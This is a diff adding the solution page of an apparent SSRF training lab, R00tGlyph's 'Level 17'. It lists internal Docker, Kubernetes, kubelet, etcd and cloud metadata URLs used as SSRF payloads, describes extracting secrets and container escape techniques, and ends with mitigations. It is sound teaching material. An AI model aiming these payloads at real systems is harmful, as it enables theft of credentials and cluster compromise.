@@ -1,0 +1,169 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 17 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 17 Solution: SSRF in Container Metadata</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities in containerized environments, targeting Docker daemon APIs and Kubernetes metadata services to extract sensitive container information.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand container architecture:</strong> Docker daemon, Kubernetes API, metadata services</li>
+                    <li><strong>Identify metadata endpoints:</strong> Docker socket, K8s API server, container metadata</li>
+                    <li><strong>Target container APIs:</strong> Access internal container management interfaces</li>
+                    <li><strong>Extract sensitive data:</strong> Environment variables, secrets, network configuration</li>
+                </ol>
+
+                <h4>Container Metadata SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Docker daemon API access
+Container ID: sha256:abc123def456...
+Metadata Endpoint: http://127.0.0.1:2375/containers/json
+
+# Docker socket via HTTP
+Metadata Endpoint: http://localhost:2376/v1.40/containers/CONTAINER_ID/json
+
+# Kubernetes metadata service
+Container ID: k8s_app_pod-name_namespace
+Metadata Endpoint: http://169.254.169.254/metadata/v1/
+
+# Container runtime metadata
+Container ID: containerd://abc123
+Metadata Endpoint: http://localhost:8080/v1/containers/abc123
+
+# Docker inspect via API
+Container ID: running_container
+Metadata Endpoint: http://127.0.0.1:2375/containers/CONTAINER_ID/json</code></pre>
+                    </div>
+                </div>
+
+                <h4>Docker API Endpoints:</h4>
+                <ul>
+                    <li><strong>/containers/json:</strong> List all containers</li>
+                    <li><strong>/containers/ID/json:</strong> Inspect specific container</li>
+                    <li><strong>/images/json:</strong> List available images</li>
+                    <li><strong>/networks:</strong> Network configuration</li>
+                    <li><strong>/volumes:</strong> Volume mounts and data</li>
+                    <li><strong>/info:</strong> Docker daemon information</li>
+                    <li><strong>/version:</strong> Docker version details</li>
+                </ul>
+
+                <h4>Kubernetes API Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Kubernetes API server access
+http://127.0.0.1:8080/api/v1/pods
+http://localhost:8080/api/v1/namespaces/default/secrets
+http://127.0.0.1:8080/api/v1/nodes
+
+# Service account token access
+http://169.254.169.254/metadata/v1/instance/service-accounts/default/token
+
+# Kubelet API access
+http://127.0.0.1:10250/pods
+http://localhost:10250/runningpods/
+http://127.0.0.1:10250/metrics
+
+# etcd database access (if exposed)
+http://127.0.0.1:2379/v2/keys/
+http://localhost:2379/v3/kv/range</code></pre>
+                    </div>
+                </div>
+
+                <h4>Container Escape Techniques:</h4>
+                <ul>
+                    <li><strong>Docker socket mounting:</strong> /var/run/docker.sock access</li>
+                    <li><strong>Privileged containers:</strong> Host system access</li>
+                    <li><strong>Capability abuse:</strong> SYS_ADMIN, SYS_PTRACE exploitation</li>
+                    <li><strong>Volume mounts:</strong> Host filesystem access</li>
+                </ul>
+
+                <h4>Sensitive Data Extraction:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Environment variables with secrets
+"Env": [
+  "DATABASE_PASSWORD=super_secret_password",
+  "API_KEY=sk-1234567890abcdef",
+  "JWT_SECRET=my_jwt_signing_key"
+]
+
+# Volume mounts revealing host paths
+"Mounts": [
+  {
+    "Source": "/var/secrets",
+    "Destination": "/app/secrets",
+    "Mode": "ro"
+  }
+]
+
+# Network configuration
+"NetworkSettings": {
+  "IPAddress": "172.17.0.2",
+  "Gateway": "172.17.0.1",
+  "Networks": {
+    "internal-network": {
+      "IPAddress": "10.0.1.100"
+    }
+  }
+}</code></pre>
+                    </div>
+                </div>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Docker CLI:</strong> docker inspect, docker ps</li>
+                    <li><strong>kubectl:</strong> Kubernetes cluster interaction</li>
+                    <li><strong>Container scanners:</strong> Trivy, Clair, Anchore</li>
+                    <li><strong>API testing tools:</strong> curl, Postman, Burp Suite</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete container configuration exposure</li>
+                    <li>Environment variable and secret extraction</li>
+                    <li>Internal network topology discovery</li>
+                    <li>Potential container escape and host compromise</li>
+                    <li>Kubernetes cluster reconnaissance</li>
+                </ul>
+
+                <h4>Cloud Container Services:</h4>
+                <ul>
+                    <li><strong>AWS ECS:</strong> Task metadata endpoint exploitation</li>
+                    <li><strong>Google GKE:</strong> Kubernetes API and metadata access</li>
+                    <li><strong>Azure AKS:</strong> Container instance metadata</li>
+                    <li><strong>Docker Swarm:</strong> Swarm mode API access</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Secure Docker daemon with TLS authentication</li>
+                    <li>Implement proper RBAC in Kubernetes</li>
+                    <li>Avoid mounting Docker socket in containers</li>
+                    <li>Use read-only root filesystems</li>
+                    <li>Implement network policies and segmentation</li>
+                    <li>Regular security scanning of container images</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Critical Container Security</h5>
+                    <p class="mb-0">Container metadata SSRF can lead to complete cluster compromise and container escape. This is especially critical in multi-tenant environments.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level17" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level18" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
